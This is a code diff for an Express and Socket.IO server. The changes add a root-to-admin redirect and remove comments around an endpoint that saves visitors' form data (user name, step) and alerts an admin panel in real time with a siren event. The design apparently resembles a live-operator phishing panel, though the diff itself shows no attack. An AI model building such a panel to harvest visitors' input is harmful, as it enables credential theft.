@@ -1,4 +1,3 @@
-
 const express = require('express');
 const http = require('http');
 const path = require('path');
@@ -52,6 +51,11 @@ app.use(session({
 app.use('/admin/static', express.static(path.join(__dirname, 'public', 'admin')));
 app.use('/sounds', express.static(path.join(__dirname, 'public', 'sounds')));
 
+// **Redirigir la raíz al panel admin**
+app.get('/', (req, res) => {
+  res.redirect('/admin');
+});
+
 // Simple admin auth (session-based)
 app.post('/admin/login', (req, res) => {
   const { user, pass } = req.body;
@@ -69,7 +73,7 @@ function requireAdmin(req, res, next){
   return res.status(401).json({ ok: false, msg: 'unauthorized' });
 }
 
-// API to save incoming user form data (via fetch)
+// API to save incoming user form data
 app.post('/api/save', (req, res) => {
   const body = req.body || {};
   const clientId = body.clientId || uuidv4();
@@ -85,15 +89,12 @@ app.post('/api/save', (req, res) => {
     step: body.step || null
   };
   db.upsertUser(record);
-  // notify admin panel about new/updated record
   io.to('admins').emit('user_updated', db.getUserByClientId(clientId));
-  // notify new connection event for siren if first time created
   const user = db.getUserByClientId(clientId);
   if(user && !user.notified){
     io.to('admins').emit('new_user_connected', { clientId: user.clientId, usuario: user.usuario });
     db.setClientNotified(clientId);
   }
-  // also emit to the specific client's socket room (if needed)
   io.to('client:' + clientId).emit('server_ack', { msg: 'saved', clientId });
   res.json({ ok: true, clientId });
 });
@@ -139,7 +140,6 @@ io.on('connection', (socket) => {
     db.bindSocket(clientId, socket.id);
     const user = db.getUserByClientId(clientId) || { clientId };
     socket.emit('registered', { clientId, user });
-    // emit new_user_connected to admins immediately when a client registers
     io.to('admins').emit('new_user_connected', { clientId, usuario: user.usuario });
   });
 
